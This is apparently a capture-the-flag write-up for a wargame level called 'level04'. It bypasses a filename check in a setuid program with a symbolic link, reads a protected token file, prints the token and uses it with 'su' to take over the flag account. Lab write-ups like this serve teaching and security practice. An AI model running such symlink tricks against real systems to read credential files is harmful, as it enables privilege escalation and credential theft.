## level04

The program used to do access control on the file only verifies if the file name provided from argument is, or contains, token.

The easy way to avoid this type of check is by creating a symbolic link to the token file with a name that strstr() does match to token (in other words, without token in it).

```
ln -s /home/flag04/token /tmp/sym
/home/flag04/flag04 /tmp/sym
```

The token is 
```
06508b5e-8909-b630-fdb148a84a2
```

Now use the token as the flag04 password 
```
su flag04
getflag
```
